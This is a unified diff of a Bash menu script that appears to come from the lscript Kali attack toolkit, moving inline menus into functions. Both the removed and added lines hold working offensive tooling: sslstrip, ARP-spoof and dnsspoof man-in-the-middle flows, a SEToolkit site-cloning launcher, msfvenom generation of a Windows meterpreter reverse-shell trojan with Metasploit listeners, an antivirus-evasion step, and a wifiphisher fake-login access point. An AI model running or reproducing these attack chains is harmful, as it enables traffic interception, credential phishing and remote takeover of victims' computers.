-				sslstrip -l $PORTTCP -w /root/sslstrip.log
-				echo -e "$PAKTGB"
-				$READAK
-				continue
-			elif [ "$MITMCH" = "33" ]
-			then
-				clear
-				echo -e "Enter your gateway(prefer eth0 gateway):"
-				read GATENM
-				echo -e ""
-				echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
-				read GATEINT
-				if [ "$GATEINT" = "" ]
-				then
-					GATEINT="eth0"
-				fi
-				clear
-				echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
-				read TARGIP
-				echo -e ""
-				echo -e "$PAKTC"
-				$READAK
-				export GATENM
-				export GATEINT
-				export TARGIP
-				export PORTTCP
-				export PORTUDP
-				cd /root/lscript/ls
-				gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
-				gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
-				gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
-				sslstrip -l $PORTTCP -w /root/sslstrip.log
-				echo -e "$PAKTGB"
-				$READAK
-				continue
-			elif [ "$MITMCH" = "4" ]
-			then
-				leafpad /root/sslstrip.log
-			#~ elif [ "$MITMCH" = "44" ]
-			#~ then
-			elif [ "$MITMCH" = "back" ]
-			then
-				clear
-				break
-			elif [ "$MITMCH" = "00" ]
-			then
-				clear
-				exec bash "$0"
-			elif [ "$MITMCH" = "0" ]
-			then
-				clear
-				exit
-			fi
-			done
-		elif [ "$MITMATT" = "2" ]
-		then
-			while true
-			do
-			clear
-			echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
-			echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
-			echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
-			echo -e ""$YS" 3"$CE") Start ARPspoofing"
-			#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
-			echo -e ""$YS" 4"$CE") Start SEToolkit"
-			echo -e ""$YS" 5"$CE") Start DNSspoofing"
-			echo -e ""$YS"back"$CE") Go back"
-			echo -e ""$YS" 0"$CE") EXIT"
-			echo -e "Choose: "
-			read -e MITMSET
-			clear
-			if [ "$MITMSET" = "1" ]
-			then
-				echo "1" > /proc/sys/net/ipv4/ip_forward
-				echo -e "Done."
-				sleep 1
-			elif [ "$MITMSET" = "d1" ]
-			then
-				echo "0" > /proc/sys/net/ipv4/ip_forward
-				echo -e "Done."
-				sleep 1
-			elif [ "$MITMSET" = "2" ]
-			then
-				route -n
-				echo -e ""
-				echo -e ""
-				echo -e "Enter your gateway:"
-				read GATENM
-				echo -e ""
-				echo -e "Enter the gateway's interface(etc: wlan0):"
-				read GATEINT
-				#~ if [ "$GATEINT" = "" ]
-				#~ then
-					#~ GATEINT="eth0"
-				#~ fi
-				while true
-				do		
-				clear
-				nmap -sP "$GATENM"/24
-				echo -e ""
-				echo -e ""
-				echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
-				read TARGIP
-				if [ "$TARGIP" = "r" ]
-				then
-					continue
-				else
-					break
-				fi
-				done
-			elif [ "$MITMSET" = "22" ]
-			then
-				echo -e "Enter your gateway:"
-				read GATENM
-				echo -e ""
-				echo -e "Enter the gateway's interface(etc: wlan0):"
-				read GATEINT
-				#~ if [ "$GATEINT" = "" ]
-				#~ then
-					#~ GATEINT="eth0"
-				#~ fi
-				clear
-				echo -e "Enter your target IP:"
-				read TARGIP
-			elif [ "$MITMSET" = "3" ]
-			then
-				export PAKTC
-				export GATEINT
-				export TARGIP
-				export GATENM
-				cd "$LPATH"/ls
-				gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
-				gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
-			#~ elif [ "$MITMSET" = "4" ]
-			#~ then
-				#~ service apache2 start
-			#~ elif [ "$MITMSET" = "d4" ]
-			#~ then
-				#~ service apache2 stop
-			elif [ "$MITMSET" = "4" ]
-			then
-				echo -e "Clone a website to one of the following IP(s):"
-				ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
-				echo -e "$PAKTC"
-				$READAK
-				gnome-terminal --geometry 66x40+999999+0 -e setoolkit
-			elif [ "$MITMSET" = "5" ]
-			then
-				echo -e "Making you a hosts.txt file"
-				echo -e ""
-				echo -e "Enter your IP address that you started the server:"
-				echo -e "One of this/these:"
-				ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
-				read -e SERVIP
-				echo -e "Enter the interface of that IP(etc: wlan0):"
-				read -e INTIP
-				if [ -f ""$LPATH"/HOSTS/hosts.txt" ]
-				then
-					rm "$LPATH"/HOSTS/hosts.txt
-				fi
-				mkdir "$LPATH"/HOSTS
-				clear
-				while true
-				do
-				clear
-				echo -e "Enter the URL you want to redirect your IP from(etc: thisis.myfakesite.com):"
-				read -e URL
-				echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
-				sleep 0.2
-				clear
-				echo -e "Add another one as well?"$YNYES""
-				read -e ANOTHERHOST
-				if [ "$ANOTHERHOST" = "n" ]
-				then
-					break
-				fi
-				done
-				clear
-				echo -e "Starting dnsspoof..."
-				echo -e "$PAKTC"
-				$READAK
-				export INTIP
-				xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
-			elif [ "$MITMSET" = "back" ]
-			then
-				clear
-				break
-			elif [ "$MITMSET" = "00" ]
-			then
-				clear
-				exec bash "$0"
-			elif [ "$MITMSET" = "0" ]
-			then
-				clear
-				exit
-			fi
-			done
-		elif [ "$MITMATT" = "00" ]
-		then
-			clear
-			exec bash "$0"
-		elif [ "$MITMATT" = "0" ]
-		then
-			clear
-			exit
-		fi
+		mitm_menu
 	elif [ "$YORNAA" = "14" ]
 	then
-		if [ ! -d /root/lscript/rc ]
-		then
-			mkdir /root/lscript/rc
-		fi
-		while true
-		do
-		clear
-		echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
-		printf '\033]2;METASPLOIT\a'
-		echo -e ""$YS" 1"$CE") Create payload"
-		echo -e ""$YS" 2"$CE") Create listener"
-		echo -e ""$YS" 3"$CE") Saved listeners"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e ""$YS" 0"$CE") EXIT"
-		echo -e "Choose: "
-		read -e METASP
-		if [ "$METASP" = "1" ]
-		then
-			clear
-			echo -e "Enter the attacker's IP: "
-			read ATIP
-			echo -e ""
-			echo -e "Enter the attacker's PORT: "
-			read ATPORT
-			echo -e ""
-			echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
-			read TARCH
-			echo -e "Enter the output path(etc "$YS"/root/Desktop/trojan.exe"$CE"): "
-			read ATEXE
-			clear
-			echo -e "Generating"
-			sleep 0.1
-			echo .
-			sleep 0.1
-			echo .
-			sleep 0.1
-			echo .
-			sleep 0.1
-			echo .
-			sleep 0.1
-			echo .
-			sleep 0.1
-			echo .
-			msfvenom -p windows/meterpreter/reverse_tcp   --platform windows -a $TARCH -f exe LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXE"
-			echo -e "Done."
-			echo -e ""
-			echo -e "$PAKTC"
-			$READAK
-		elif [ "$METASP" = "z" ]
-		then
-			clear
-			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
-			sleep 3
-			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-			read MUSTBEYES
-			if [ "$MUSTBEYES" = "YES" ] 
-			then 
-				clear
-				cd /root/zirikatu
-				./zirikatu.sh
-			fi
-		elif [ "$METASP" = "2" ]
-		then
-			clear
-			echo -e "LHOST: "
-			read LHOSTL
-			echo -e "LPORT: "
-			read LPORTL
-			echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
-			read PAYLOADL
-			if [ -z "$PAYLOADL" ]
-			then
-				echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
-				sleep 2
-				PAYLOADL="windows/meterpreter/reverse_tcp"
-			fi
-			echo -e "Name of listener(etc: "$YS"john"$CE") : "
-			read NAMEL
-			echo "use exploit/multi/handler" > /root/lscript/rc/"$NAMEL".rc
-			echo "set PAYLOAD $PAYLOADL " >> /root/lscript/rc/"$NAMEL".rc
-			echo "set LHOST $LHOSTL " >> /root/lscript/rc/"$NAMEL".rc
-			echo "set LPORT $LPORTL " >> /root/lscript/rc/"$NAMEL".rc
-			echo "set ExitOnSession false" >> /root/lscript/rc/"$NAMEL".rc
-			echo "exploit -j" >> /root/lscript/rc/"$NAMEL".rc
-			clear
-			echo -e "Launch the listener now? "$YNONLY""
-			read LLN
-			if [ "$LLN" = "y" ]
-			then
-				echo -e "Launching msfconsole..."
-				sleep 2
-				clear
-				msfconsole -r /root/lscript/rc/"$NAMEL".rc
-			fi
-		elif [ "$METASP" = "3" ]
-		then
-			while true
-			do
-			clear
-			ls /root/lscript/rc
-			echo -e "Enter the name of the above listener(s) you want to select(etc: "$YS"john"$CE")"
-			echo -e ""$YS"back"$CE") Go back"
-			read NAMERC
-			clear
-			if [ "$NAMERC" = "back" ]
-			then
-				break
-			fi
-			if [ ! -f /root/lscript/rc/"$NAMERC" ]
-			then
-				NAMERC="$NAMERC".rc
-				if [ ! -f /root/lscript/rc/"$NAMERC" ]
-				then
-					echo -e "File not found. Try again.."
-					sleep 2
-					continue
-				fi
-			fi
-			while true
-			do
-			clear
-			echo -e ""$NAMERC" selected."
-			echo -e ""$YS" 1"$CE") Start listener"
-			echo -e ""$YS" 2"$CE") Delete listener"
-			echo -e ""$YS"back"$CE") Go back"
-			echo -e "Choose: "
-			read LISTL
-			if [ "$LISTL" = "1" ]
-			then
-				msfconsole -r /root/lscript/rc/"$NAMERC"
-			elif [ "$LISTL" = "2" ]
-			then
-				rm /root/lscript/rc/"$NAMERC"
-				break
-			elif [ "$LISTL" = "back" ]
-			then
-				break
-			fi
-			done
-			done
-		elif [ "$METASP" = "back" ]
-		then
-			clear
-			break
-		elif [ "$METASP" = "00" ]
-		then
-			clear
-			exec bash "$0"
-		elif [ "$METASP" = "0" ]
-		then
-			clear
-			exit
-		fi
-		done
+		metasploit_menu
 	elif [ "$YORNAA" = "exit" ]
 	then
 		exit
 	elif [ "$YORNAA" = "update" ]
 	then
-		#----------update-check-----------
 		printf '\033]2;UPDATE\a'
 		clear
-		echo -e "Checking for updates..."
-		TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
-		if [ "$TESTINTERNETCONNECTION" != "" ]
-		then
-			VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
-			if [ "$VERSION" != "$VER" ]
-			then
-			clear
-			echo -e "There is an update available."
-			echo -e "Current version: $VERSION"
-			echo -e "Updated version: $VER"
-			echo -e "$PAKTC"
-			$READAK
-			clear
-			echo -e "Do you want to update?"$YNONLY": "
-			read UPDATEYN
-			if [ "$UPDATEYN" = "y" ]
-			then
-				clear
-				echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
-				sleep 2
-				mkdir /root/lscriptold
-				echo -e ""
-				echo -e "Moving lscript to lscriptold"
-				sleep 2
-				mv /root/lscript /root/lscriptold
-				echo -e "Cloning the latest github version to new /root/lscript"
-				sleep 2
-				cd
-				git clone https://github.com/arismelachroinos/lscript.git
-				cd "$LPATH"
-				chmod +x install.sh
-				clear
-				echo -e "Ok , everything seems to be fine by now."
-				sleep 1
-				echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
-				echo -e ""
-				sleep 4
-				echo -e "$PAKTC"
-				$READAK
-				cd "$LPATH"
-				gnome-terminal -e ./install.sh
-				clear 
-				if [ -d /root/lscriptold/ks ]
-				then
-					echo -e "Copying old shortcuts"
-					cp /root/lscriptold/ks "$LPATH"
-					sleep 1
-					echo -e "Done."
-					sleep 1
-					clear
-				fi
-				sleep 1
-				echo -e ""
-				echo -e "Removing old lscript"
-				rm -rf /root/lscriptold
-				echo -e "Exiting..."
-				sleep 1
-				exit
-			else 
-				clear
-				echo -e "You didnt select "y" so you go back..."
-				sleep 3
-				exec bash "$0"
-			fi
-			else
-			echo -e "There is no update available"
-			sleep 1
-			echo -e "Installed version: $VERSION"
-			sleep 1
-			echo -e "Github version:    $VER"
-			sleep 1
-			echo -e "$PAKTGB"
-			$READAK	
-			exec bash "$0"
-			fi
-		else
-			clear
-			echo -e "There is no connection."
-			sleep 1
-			echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
-			echo -e ""
-			echo -e "$PAKTGB"
-			$READAK
-			exec bash "$0"
-		fi
+		update_lscript
 	elif [ "$YORNAA" = "if" ]
 	then
 		ifconfig
@@ -2330,96 +2478,19 @@ var1=1
 		exec bash "$0"
 	elif [ "$YORNAA" = "errors" ]
 	then
-		#---------------------------------------------------------------------------------------------------------------------------
-		echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
-		printf '\033]2;ERRORS\a'
-		echo -e ""$YS" 1"$CE") Fix no audio issue"
-		echo -e ""$YS" 2"$CE") No output in wash"
-		echo -e ""$YS" 3"$CE") No full screen"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e ""$YS" 0"$CE") EXIT"
-		echo -e " Choose: "
-		read ERRS
-		if [ "$ERRS" = "1" ]
-		then
-			clear
-			echo -e "Trying to get you some audio..."
-			sleep 2
-			clear
-			echo -e "Press "$YS"y"$CE" if/when prompted"
-			sleep 3
-			clear
-			echo -e "Installing pulseaudio......."
-			sleep 1
-			apt-get pulseaudio
-			echo -e "Enabling pulseaudio......."
-			sleep 1
-			systemctl --user enable pulseaudio && systemctl --user start pulseaudio
-			clear
-			echo -e "Done!"
-			sleep 1
-			clear
-			echo -e "I mean...Try to see if you have audio."
-			sleep 3
-			echo -e " "
-			echo -e "That's all i can do :/"
-			sleep 2
-			echo -e " "
-			echo -e "If it wasn't fix , then try rebooting"
-		elif [ "$ERRS" = "2" ]
-		then
-			clear
-			echo -e "Ok...Lets try to fix this..."
-			sleep 1
-			mkdir /etc/reaver
-			echo -e "It seems to be fixed."
-			echo -e "Enter you interface"
-			read INTWASH
-			echo -e "Press "$YS"many key"$CE" to test wash"
-			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
-			wash -i $INTWASH
-		elif [ "$ERRS" = "3" ]
-		then
-			apt-get install open-vm-tools-desktop fuse
-			echo -e "Restart your vistual machine..."
-			sleep 2
-			echo -e "$PAKTGB"
-			$READAK
-		elif [ "$ERRS" = "back" ]
-		then
-			clear
-			break
-		elif [ "$ERRS" = "0" ]
-		then
-			clear
-			echo -e "EXITING"
-			sleep 1
-			clear
-			exit
-		elif [ "$ERRS" = "00" ]
-		then
-			clear
-			exec bash "$0"
-		else
-			clear
-			echo -e "Not an valid option...."
-			exec bash "$0"
-		fi
-		#---------------------------------------------------------------------------------------------------------------------------
-	elif [ "$YORNAA" = "start" ]
+		errors_menu
+	elif [ "$YORNAA" = "wififb" ]
 	then
-		#~ echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
-		#~ ifconfig eth0 down
-		#~ macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
-		#~ ifconfig eth0 up
+		echo -e "Enter the name of the access point you want to create: "
+		read -e ESSIDAP
+		export ESSIDAP
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' 
+	elif [ "$YORNAA" = "start" ]
+	then		
 		echo -e "Enabling $WLANN..."
 		rfkill unblock wifi; rfkill unblock all
 		ifconfig $WLANN up
 		echo -e "$WLANN enabled"
-		#~ echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
-		#~ ifconfig $WLANN down
-		#~ macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
-		#~ ifconfig $WLANN up
 		echo -e "Enabling $WLANNM..."
 		echo -e "Killing services..."
 		airmon-ng check kill
@@ -2447,15 +2518,6 @@ var1=1
 		echo -e "Starting network-manager service..."
 		service network-manager start
 		echo -e "ok..."
-		#~ echo -e "$WLANN is probably down.Bring it up?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
-		#~ read -e YORN
-		#~ if [ "$YORN" = "y" ]  
-		#~ then
-			#~ #rfkill unblock wifi
-			#~ #rfkill unblock all
-			#~ ifconfig $WLANN up
-			#~ echo -e "$WLANN is now up."
-		#~ fi
 		echo -e "Changing mac address of $WLANN to the original one..."
 		ifconfig $WLANN down
 		macchanger -p $WLANN
@@ -2477,9 +2539,15 @@ var1=1
 			#~ clear
 			#~ exec bash "$0"
 		fi
-echo -e "$PAKTGB"
-$READAK
-exec bash "$0"
+if [ "$BACKL" = "1" ]
+then
+	exec bash "$0"
+	
+else
+	echo -e "$PAKTGB"
+	$READAK
+	exec bash "$0"
+fi
 #~ echo -e "Choose again?"$YNYES": "
 #~ read -e YORNLAST
 #~ if [ -z "$YORNLAST" ]
